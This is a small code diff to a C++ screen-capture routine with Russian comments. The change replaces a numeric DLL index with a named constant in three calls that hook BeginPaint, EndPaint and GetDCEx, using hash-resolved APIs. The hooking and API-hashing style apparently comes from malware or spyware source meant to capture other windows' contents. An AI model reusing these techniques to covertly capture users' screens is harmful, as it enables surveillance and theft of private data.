@@ -394,9 +394,9 @@ bool ScreenShot::DrawWindow( HWND Wnd, PWCHAR FileName )
 	FillBackground( Wnd, dcMem );
 
 	//хукаем
-	if( !HookApi( 3, Hash_BeginPaint, HookBeginPaint, &Real_BeginPaint ) ) return false;
-	if( !HookApi( 3, Hash_EndPaint, HookEndPaint, &Real_EndPaint ) ) return false;
-	if( !HookApi( 3, Hash_GetDCEx, HookGetDCEx, &Real_GetDCEx ) ) return false;
+	if( !HookApi( DLL_USER32, Hash_BeginPaint, HookBeginPaint, &Real_BeginPaint ) ) return false;
+	if( !HookApi( DLL_USER32, Hash_EndPaint, HookEndPaint, &Real_EndPaint ) ) return false;
+	if( !HookApi( DLL_USER32, Hash_GetDCEx, HookGetDCEx, &Real_GetDCEx ) ) return false;
 
 	//посылка события основному окну
 	pSendMessageA( Wnd, WM_NCPAINT, WPARAM(1), 0 );
